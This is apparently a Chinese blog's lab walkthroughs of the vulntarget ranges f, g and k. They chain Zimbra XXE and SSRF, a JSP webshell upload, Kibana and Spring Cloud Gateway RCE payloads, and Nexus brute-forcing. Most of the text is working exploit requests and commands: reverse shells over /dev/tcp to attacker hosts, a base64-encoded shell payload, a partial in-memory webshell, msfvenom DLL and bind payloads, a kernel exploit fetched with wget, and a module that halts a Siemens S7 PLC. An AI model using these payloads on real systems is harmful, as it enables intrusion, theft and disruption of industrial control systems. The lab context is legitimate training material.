POST /Autodiscover/Autodiscover.xml/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 404 &lt;!DOCTYPE Autodiscover [        &lt;!ENTITY % dtd SYSTEM &quot;http://192.168.150.128/poc.dtd&quot;&gt;        %dtd;        %all;        ]&gt;&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;    &lt;Request&gt;        &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;&lt;/Autodiscover&gt;


接着利用已经得到的密码获取低权限的token，低权限的token可以通过soap接口发送AuthRequest进行获取，url改为/service/soap或/service/admin/soap，可以返回一个低权限的token
poc如下：
POST /service/admin/soap HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 463 &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;   &lt;soap:Header&gt;       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;       &lt;/context&gt;   &lt;/soap:Header&gt;   &lt;soap:Body&gt;     &lt;AuthRequest xmlns=&quot;urn:zimbraAccount&quot;&gt;        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;        &lt;password&gt;XbVaoX3Y&lt;/password&gt;     &lt;/AuthRequest&gt;   &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; # ZM_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;


再通过ssrf漏洞获取proxy接口，访问soap接口来获取到高权限的token
访问/service/proxy?target=``https://127.0.0.1:8443/service/admin/soap，对其进行抓包，修改为POST，cookie改为得到的低权限token（等级替换为ZM_ADMIN_AUTH_TOKEN），xmlns改为urn:zimbraAdmin
poc如下：
POST /service/admin/soap/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZM_ADMIN_AUTH_TOKEN=0_2d4b50e77e5ae4298afd620f5d90d68e61dc8bcf_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303637343037373736323b747970653d363a7a696d6272613b7469643d31303a313836303539373536383b;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 461 &lt;soap:Envelope xmlns:soap=&quot;http://www.w3.org/2003/05/soap-envelope&quot;&gt;   &lt;soap:Header&gt;       &lt;context xmlns=&quot;urn:zimbra&quot;&gt;           &lt;userAgent name=&quot;ZimbraWebClient - SAF3 (Win)&quot; version=&quot;5.0.15_GA_2851.RHEL5_64&quot;/&gt;       &lt;/context&gt;   &lt;/soap:Header&gt;   &lt;soap:Body&gt;     &lt;AuthRequest xmlns=&quot;urn:zimbraAdmin&quot;&gt;        &lt;account by=&quot;adminName&quot;&gt;zimbra&lt;/account&gt;        &lt;password&gt;XbVaoX3Y&lt;/password&gt;     &lt;/AuthRequest&gt;   &lt;/soap:Body&gt;&lt;/soap:Envelope&gt; # ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b;


最后利用高权限的token上传文件从而getshell，这里我们使用python脚本上传webshell，shell路径为/downloads/shell.jsp（访问shell的时候得加上ADMIN_AUTH_TOKEN
import requests file= &#123;&#x27;filename1&#x27;:(None,&quot;whocare&quot;,None),&#x27;clientFile&#x27;:(&quot;shell.jsp&quot;,r&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&#x27;,&quot;text/plain&quot;),&#x27;requestId&#x27;:(None,&quot;12&quot;,None),&#125;   #这里我上传的是一个冰蝎的马headers =&#123;&quot;Cookie&quot;:&quot;ZM_ADMIN_AUTH_TOKEN=0_e78154820c9cf010bff124807fd2a5d976753ba1_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313637303534353633313531323b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3239333533313533393b&quot;,    #修改成上面获取到的的admin_token&quot;Host&quot;:&quot;foo:7071&quot;&#125;r=requests.post(&quot;https://192.168.150.141:7071/service/extension/clientUploader/upload&quot;,files=file,headers=headers,verify=False)   #ip也需要修改print(r.text)

上传成功后通过冰蝎连接，添加cookie请求头，shell路径如下
https://192.168.150.141:7071/downloads/shell.jsp# 密码：rebeyond

然后和前面的操作就一样了
内网渗透利用frp建立代理
./frps -c ./frps.ini


./frpc -c ./frpc.ini &amp;


上传fscan扫一下内网，发现存在主机192.168.20.129，开放了22、5601、9200、9300端口


访问如下，可以得知是kibana


横向渗透搜索一下相关漏洞，发现有个CVE-2019-7609 Kibana远程代码执行漏洞
POC .es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1\&#x27;&quot;);//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;) .es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/You_VPS/You_VPS_Port 0&gt;&amp;1&quot;);process.exit()//&#x27;) .props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)

漏洞复现
在导航栏中点击Timelion，在文本框中输入如下反弹shell的poc并运行
# exec括号后面的内容为代码执行.es(*).props(label.__proto__.env.AAAA=&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/192.168.20.128/8888 0&gt;&amp;1\&#x27;&quot;);process.exit()//&#x27;).props(label.__proto__.env.NODE_OPTIONS=&#x27;--require /proc/self/environ&#x27;)


然后点击左侧导航栏的Canvas，成功接收到shell

或者直接拿**exp**打（没打成功，这里靶场环境存在一些问题
python2 CVE-2019-7609-kibana-rce.py -u 192.168.20.129:5601 -host 192.168.20.128 -port 8888 --shell


然后nc监听8888端口成功连上，进行信息收集一波发现192.168.30.128的网卡

接着尝试Ubuntu内核提权等，最后利用**CVE-2022-0847**在本地编译再上传运行从而成功提权
首先本地编译好并开启web服务
./compile.shpython -m http.server 80

再去centos中下载并开启web服务
wget http://192.168.150.128/exploitpython -m SimpleHTTPServer 80

再来到ubuntu中下载编译好的exp时发现一直没反应，后面会提示是没有权限下载，所以再去tmp目录下进行下载即可成功下载
cd tmpwget http://192.168.20.128/exploit

执行exp提权，发现报错说我编译的版本太高了
chmod +x exploit./exploit


后面换了个较低版本的Ubuntu18.4的进行编译成功提权，并找到flag：vulntarget{admin&#x2F;top1000.txt}

还有个集成好的提权工具**traitor**可以利用（但是这里我没利用成功

再上传fscan扫一下内网，发现还有个192.168.30.129的网卡开放了22、8081端口

接着上传frp建立代理
chmod 777 frpc    # 如果用+x这里不知道为啥还是会显示没权限nohup ./frpc -c ./frpc.ini &amp;

访问8081端口如下，可以得知是Nexus 3.21.0-05

搜索其漏洞可以发现可能存在CVE-2020-10199远程代码执行漏洞，但是需要先知道账号密码，弱口令尝试了一下都不行，回头看前面我们得到的flag的内容，可以猜测到这里的账号就是admin，而密码则是top1000中的一个，于是通过burp爆破密码，抓包可以看出这里账号密码是加密的，并且不难看出是base64

于是这里payload设置为base64，并添加top1000字典

爆破出来后base64解出密码：abcdef

登录后抓包获取登录后的cookie及csrf属性

但是后面这里执行命令却不行了

但是它影响版本：Nexus Repository Manager OSS&#x2F;Pro 3.x &lt;&#x3D; 3.21.1，再尝试直接利用**exp**打一下成功了，并找到flag：vulntarget-f{(^^ this__is__flag ^^}

]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-g</title>
    <url>/2022/12/20/vulntarget-g/</url>
    <content><![CDATA[
机器密码：
winxp_HMI：vuln&#x2F;Admin@123.
winxp_ZJQ：winxp：winXP_ZIJINQIAO
账号1：Administrator密码1：#xYpo3;W6aS
账号2：vulntarget密码2：#xYpo3;W6aS
win7_ForceControl：win7&#x2F;admin
win7_S7-Client：tegratnluv&#x2F;Vu1Nt@rG3t9Gg
win7_S7-Server：Vu1NT4r93t&#x2F;welcometoICS
拓扑图：


准备工作这里就按拓朴图中的来修改VMnet的配置，并恢复快照至初始状态，若还有问题可以跟着搭建文档来一遍
信息收集扫描存活主机和端口，发现开放了80、135、139、445、1234、4322端口

访问80端口报404，如下：

访问1234端口没反应，再访问4322端口还是没反应，毫无思路，这就是工控吗.jpg

1234端口可能对应LAquis的服务，但是这个服务存在web页面，访问并没有存在web页面
4322端口可能运行 InduSoft Web Studio 的嵌入式HMI软件，存在msf模块可以直接exp，这里我们导入模块,并使用配置好msf攻击模块

漏洞利用InduSoft Web Studio RCE我们直接利用msf来打这个嵌入式HMI软件-InduSoft Web Studio RCE漏洞（一个2011年的工控CVE漏洞）但是第一次没打成功，直接整懵逼了😅

后面把浏览器关闭访问，再执行一次发现可以了但是不会反弹shell（人麻了，这是为什么🥲
use exploit/windows/scada/indusoft_webstudio_execset rhost 192.168.150.144run


最后无脑恢复快照，再尝试几次后突然就又行了🙌

发现192.168.90.40的网卡，于是先上传frp建立代理，发现这是32位的没法用
meterpreter &gt; upload /root/web/frpc.exemeterpreter &gt; upload /root/web/frpc.inimeterpreter &gt; execute -f frpc.exe -c ./frpc.ini &amp;[-] stdapi_sys_process_execute: Operation failed: is not a valid Win32 application.

所以直接msf添加路由以及sock代理
run get_local_subnetsrun autoroute -s 192.168.90.0/24run autoroute -puse auxiliary/server/socks_proxy# set srvport 2022run


再给kali设置代理
vim /etc/proxychains4.confsocks5 127.0.0.1 1080

接着扫描一些常见端口，可以发现存活主机192.168.90.110开放了135、139、445端口
use auxiliary/scanner/portscan/tcpset rhosts 192.168.90.0/24set ports 22,23,80,135,139,445,1433,3306,3389,8080run


再使用这个模块来探测，指定该IP扫一下端口发现开放了1234、1235、3389端口

CVE-2017-6020访问1234端口发现存在LAquis服务，而1235端口无法访问，因此我们就只能将1234端口作为突破口

搜索相关漏洞可以发现存在任意文件读取漏洞可利用


LAquis SCADA是巴西LCDS公司的一套SCADA（数据采集与监视控制）系统。该系统主要用于对设备进行数据采集和过程控制。4.1.0.4150之前版本的LCDS Laquis SCADA 允许通过打开特制的报告格式文件(.lgx)来执行脚本代码。这可能导致代码执行、数据泄露或系统崩溃

msf如果没有可以先去下载一下漏洞利用脚本并将其放入/usr/share/metasploit-framework/modules/exploits/windows/scada/路径下，便于归类和查找（文件名可以随意修改

打开msf输入如下命令即可
reload_all



参数说明：
DEPTH 到达基本目录的级别，(也就是有多少个..&#x2F;)，如果安装时未更改路径，默认就是向上跳转10级。如果更改路径漏洞利用不成功，可以根据实际情况调整此参数。
FILE 这是要下载的文件,与上面的DEPTH参数结合组成完整的文件路径。
Proxies 端口[，类型：主机：端口] […]的代理链
RHOSTS 目标主机，范围CIDR标识符或具有语法’file：‘的主机文件
RPORT 目标端口（TCP），软件默认安装是1234，不排除更改的可能。
SSL 协商出站连接的SSL &#x2F; TLS
VHOST HTTP服务器虚拟主机

这里我们只需要修改file和rhost这两个参数即可（其中file文件路径可在之前的session中桌面的工作日记.md（前面msf中也下不了这个中文文件，不过可以传个🐎用蚁剑或者cs连上下载文件）中找到关键信息位于C:\document\information.txt

use exploit/windows/scada/LAquis_cve_2017_6020set file document/information.txtset rhosts 192.168.90.110

run一下即可得到文件

查看发现kali中会乱码，应该是编码问题，拖到Windows下就正常了，得到了一些主机的账密

这里的主机1应该就是前面打的那个奇怪的嵌入式HMI软件-InduSoft Web Studio的机子，而主机2应该就是现在打的这台，尝试3389成功进入，并且发现还存在192.168.95.66的网卡

CNVD-2020-31508在桌面还发现有个ProgMan的软件，找到文件位置可以看到他的版本信息是6.5，是个紫金桥的工程管理器

搜一下相关漏洞发现有DLL劫持漏洞（一开始搜ProgMan没找到🤐

准备工作：上传procexp.exe（现在的v17版本在winxp中用不了，可以去其他站点下载低版本的就支持winxp）与dllinject.exe（同样需要去其他站点下个老版本的才能用）文件，上传文件需要换成Windows下rdp进行传输，并按照下图配置后连接rdp即可成功复制粘贴进去

接着寻找可劫持进程ProgMan.exe的dll，利用msf基于dll劫持实现提权
1.开启进程ProgMan.exe，用procexp.exe查看进程加载的dll

2.与注册表项进行对比

3.利用msfvenom指令创建反弹shell的dll文件，使用正向连接并将其上传
msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f dll &gt; ws2help.dll


4.利用msf中的handler模块开启监听
use exploit/multi/handler set payload windows/meterpreter/bind_tcpset rhost 192.168.90.110set lport 1234

5.利用DllInject.exe将ws2help.dll注入到进程

6.注入后msf成功上线，但是我这里尝试了一波都没反应的🤡在procexp中查看发现已经注入了呀 后面说是重启一下靶机就可以成功上线实现提权（不过我一直没成功😴
IDA动态调试力控软件前面我们还有个主机3的账密没用到，于是我们就再扫一下发现存活两台主机192.168.95.100和192.168.95.110
use auxiliary/scanner/portscan/tcpset rhosts 192.168.95.0/24set ports 22,23,80,135,139,445,1433,3306,3389,8080


尝试一下可知主机3是192.168.95.110

并且根据前面得到的提示我们需要在力控软件中找到密码

终于来到这里了，可是却没有得到主机4的账户密码，但是根据可靠消息得知，主机4的账户、密码可能在力控软件的用户信息里，你能找到他吗？

接着在功能 - 用户管理中找到个系统管理员级的用户tegratnluv，但是密码看不了

不过这里有修改功能，我们可以通过修改密码在后面加个test保存然后IDA动态调试找到密码对应的hex（需要以管理员打开IDA，不然后面调试不了该进程）

接着调试进程，点击Debugger - Attach - Local Windows debugger选择指定进程如下：

然后按alt+b调出搜索，搜索对应的hex即可（这里需要注意要改个不常见的字符串，不然像我这test有一堆🥲

不过第一个就成功找到密码：Vu1Nt@rG3t9Gg

西门子S7-300启停攻击根据前面得到的账密成功连接rdp，发现开着个S7COMM的客户端模拟器，确定是上位机（没开防火墙

并发现还存在网卡172.16.1.37

于是我们用msf做个正向马并上传
msfvenom -p windows/meterpreter/bind_tcp lport=4444 -f exe &gt; test.exe


开启监听成功上线
use exploit/multi/handler set payload windows/meterpreter/bind_tcpset rhost 192.168.95.100set lport 4444


接着找到下位机的主机172.16.1.3

再设置一下自动路由
run post/multi/manage/autoroute


接下来的操作就不是很懂了，这个不是可以直接点stop停止吗😂说明未授权？
这里我们在上位机中可以看到S7的服务端正在运行，我们的目的就是要把下位机打停机

然后使用ISF来进行攻击，已知这时S7-300的模拟器，ISF中存在这一型号的利用模块可以直接利用，ISF的工程项目，输入如下命令即可成功让其停止工作
python2 isf.pyuse exploits/plcs/siemens/s7_300_400_plc_controlset target 172.16.1.3



]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
        <tag>工控</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-k</title>
    <url>/2023/01/13/vulntarget-k/</url>
    <content><![CDATA[
机器密码：
xxl-job-admin：xxl-job&#x2F;root123；admin&#x2F;Bolean@10000
nacos-springcloudgateway：spring-nacos&#x2F;root123；nacos&#x2F;bolean@1q2
redis：redis&#x2F;redis@1z；redis密码：nbsg@123456
拓扑图：


准备工作修改一下xxl-job的网卡
sudo ifconfig ens33 192.168.150.11/24 up


或者修改网络配置文件
sudo vim /etc/netplan/00-installer-config.yamlsudo netplan apply


信息收集扫描存活主机和端口，发现开放了22、8080、8081、9999端口

访问8080、8081端口报错404

9999端口报错500，后面根据搜索报错信息确认是xxl-job服务，存在xxl-job RCE未授权远程命令执行
&#123;&quot;code&quot;:500,&quot;msg&quot;:&quot;invalid request, HttpMethod not support.&quot;&#125;



漏洞利用xxl-jobpayload如下：
POST /run HTTP/1.1Host: 192.168.150.11:9999User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 356 &#123;  &quot;jobId&quot;: 1,    // 任务ID  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,    // 任务标识  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,    // 任务参数  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,    // 任务阻塞策略，可选值参考com.xxl.job.core.enums.ExecutorBlockStrategyEnum  &quot;executorTimeout&quot;: 0,     // 任务超时时间，单位秒，大于零时生效  &quot;logId&quot;: 1,        // 本次调度日志ID  &quot;logDateTime&quot;: 1586629003729,        // 本次调度日志时间  &quot;glueType&quot;: &quot;GLUE_POWERSHELL&quot;,    // 任务模式，可选值参考com.xxl.job.core.glue.GlueTypeEnum  &quot;glueSource&quot;: &quot;calc&quot;,        // GLUE脚本代码  &quot;glueUpdatetime&quot;: 1586699003758,    // GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新  &quot;broadcastIndex&quot;: 0,        // 分片参数：当前分片  &quot;broadcastTotal&quot;: 0        // 分片参数：总分片&#125;


接着访问一下IP:8080/xxl-job-admin/toLogin任务调度中心登录如下：

尝试弱口令admin/123456登录失败，再尝试命令执行来反弹shell，但是nc监听并没有返回，这里需要注意其中的任务模式glueType
BEAN(&quot;BEAN&quot;, false, null, null),GLUE_GROOVY(&quot;GLUE(Java)&quot;, false, null, null),GLUE_SHELL(&quot;GLUE(Shell)&quot;, true, &quot;bash&quot;, &quot;.sh&quot;),GLUE_PYTHON(&quot;GLUE(Python)&quot;, true, &quot;python&quot;, &quot;.py&quot;),GLUE_PHP(&quot;GLUE(PHP)&quot;, true, &quot;php&quot;, &quot;.php&quot;),GLUE_NODEJS(&quot;GLUE(Nodejs)&quot;, true, &quot;node&quot;, &quot;.js&quot;),GLUE_POWERSHELL(&quot;GLUE(PowerShell)&quot;, true, &quot;powershell&quot;, &quot;.ps1&quot;);


然后修改glueType为GLUE_SHELL再来尝试一下成功反弹shell
POST /run HTTP/1.1Host: 192.168.150.11:9999User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 397 &#123;  &quot;jobId&quot;: 1,  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,  &quot;executorTimeout&quot;: 0,  &quot;logId&quot;: 1,  &quot;logDateTime&quot;: 1586629003729,  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.150.128/1234 0&gt;&amp;1&quot;,  &quot;glueUpdatetime&quot;: 1586699003758,  &quot;broadcastIndex&quot;: 0,   &quot;broadcastTotal&quot;: 0&#125;


在/root目录下得到flag1：flag{xxl_job_admin_2.2.0_RCE}

还发现存在网卡192.168.100.20

于是上传fscan扫一下内网，发现存在主机192.168.100.50
wget http://192.168.150.128/fscanchmod +x fscan./fscan -h 192.168.100.20/24 


再来单独扫一下这台主机发现开放了22、8800、8848端口，存在nacos和SpringCloud服务并且有漏洞如下：
root@vulntarget-k:/home/xxl-job/xxl-jar# ./fscan -h 192.168.100.50 -p 1-65535 -np&lt;b/xxl-jar# ./fscan -h 192.168.100.50 -p 1-65535 -np    ___                              _      / _ \     ___  ___ _ __ __ _  ___| | __  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;    \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.2start infoscan192.168.100.50:22 open192.168.100.50:8800 open192.168.100.50:8848 open[*] alive ports len is: 3start vulscan[*] WebTitle: http://192.168.100.50:8800 code:503 len:292    title:None[*] WebTitle: http://192.168.100.50:8848 code:404 len:431    title:HTTP Status 404 – Not Found[+] http://192.168.100.50:8848 poc-yaml-alibaba-nacos [+] http://192.168.100.50:8848 poc-yaml-alibaba-nacos-v1-auth-bypass [+] http://192.168.100.50:8800 Spring-Cloud-CVE-2022-22947 [+] http://192.168.100.50:8800 poc-yaml-spring-actuator-heapdump-file [+] http://192.168.100.50:8800 poc-yaml-springboot-env-unauth spring2

springcloudgateway首先我们来看看8800端口，存在Spring-Cloud-CVE-2022-22947，尝试直接利用poc发现无法执行命令

于是手工复现一下，先添加包含恶意的路由，201代表创建成功，payload如下：
POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 325&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;


再刷新网关路由即可触发该payload
POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/x-www-form-urlencodedUpgrade-Insecure-Requests: 1Cache-Control: max-age=0


访问/actuator/gateway/routes/test即可回显命令执行的结果

执行ifconfig发现还有个网卡192.168.88.68

执行cat /root/flag得到flag2：flag{nacos_springcloudgateway_rce}
POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 352&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;cat\&quot;, \&quot;/root/flag\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;


于是尝试反弹shell，对 getruntime 执行命令进行编码或者使用数组的形式命令执行，直接curl，但是都无法反弹shell，有可能是那种不出网的，nc收不到东西都
POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 325&#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1MC4xMjgvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;&#125;).getInputStream()))&#125;&quot;    &#125;  &#125;],  &quot;uri&quot;: &quot;http://example.com&quot;&#125;


可能可以写入内存🐎吧，后面直接给我干蓝屏了😇咕咕咕~

完事后需要删除所添加的路由，再刷新网关路由触发payload
DELETE /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0

附上作者wp写哥斯拉马的payload
POST /actuator/gateway/routes/test HTTP/1.1Host: 192.168.100.50:8800User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeContent-Type: application/jsonUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Length: 10916 &#123;  &quot;id&quot;: &quot;test&quot;,  &quot;filters&quot;: [&#123;    &quot;name&quot;: &quot;AddResponseHeader&quot;,    &quot;args&quot;: &#123;      &quot;name&quot;: &quot;Result&quot;,      &quot;value&quot;: &quot;#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;ms.GMemShell&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBA